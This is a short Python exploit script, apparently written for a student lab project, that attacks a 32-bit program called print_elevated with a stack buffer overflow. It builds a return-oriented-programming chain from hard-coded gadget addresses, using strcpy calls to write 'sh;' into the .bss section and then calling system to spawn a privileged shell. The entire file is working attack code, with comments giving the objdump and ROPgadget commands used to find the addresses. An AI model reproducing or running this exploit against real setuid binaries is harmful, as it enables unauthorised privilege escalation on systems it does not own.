#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Yanis Alim

import struct
import os

BUFF_SIZE = 256
TARGET    = "/home/admin/print_elevated"
EBP       = "BBBB"

# ./ROPgadget.py --binary /home/Yan1x0s/Projet_M1/web_files/home_admin_print_elevated --memstr 'sh;'
addr_s  = struct.pack('<L', 0x08048142)
addr_h  = struct.pack('<L', 0x08048187)
addr__  = struct.pack('<L', 0x08048737)

# objdump -x /home/Yan1x0s/Projet_M1/web_files/home_admin_print_elevated | grep bss
addr_bss = 0x080499c0

# objdump -d -M intel /home/Yan1x0s/Projet_M1/web_files/home_admin_print_elevated | grep system@plt
addr_system = struct.pack('<L', 0x08048470)

# objdump -d -M intel /home/Yan1x0s/Projet_M1/web_files/home_admin_print_elevated | grep strcpy@plt
addr_strcpy = struct.pack('<L', 0x08048450)

addr_ret = struct.pack('<L', 0x080486ce)

final_exploit = "A" * BUFF_SIZE + EBP + \
                addr_strcpy + addr_ret + struct.pack('<L', addr_bss)      +  addr_s + \
                addr_strcpy + addr_ret + struct.pack('<L', addr_bss + 1)  +  addr_h + \
                addr_strcpy + addr_ret + struct.pack('<L', addr_bss + 2)  +  addr__ + \
                addr_system + "EXIT"   + struct.pack('<L', addr_bss)          
                
os.system("{0} '{1}'".format(TARGET, final_exploit))